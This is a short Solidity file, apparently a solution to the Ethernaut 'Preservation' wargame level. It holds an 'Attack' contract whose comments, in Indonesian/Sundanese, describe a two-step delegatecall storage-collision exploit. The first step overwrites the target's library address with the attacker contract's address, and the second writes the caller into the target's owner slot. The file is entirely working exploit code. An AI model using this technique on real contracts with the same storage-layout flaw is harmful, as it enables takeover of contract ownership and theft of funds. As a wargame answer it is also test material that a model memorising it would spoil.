// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }

    function attack(address _targetAddress) public {
        IPreservation target = IPreservation(_targetAddress);

        // Tahap 1: timpa timeZone1Library jadi address contract Attack ini
        target.setFirstTime(uint256(uint160(address(this))));

        // Tahap 2: sekarang delegatecall nuju ke Attack.setTime(), nulis ke slot owner
        target.setFirstTime(uint256(uint160(msg.sender)));
    }
}
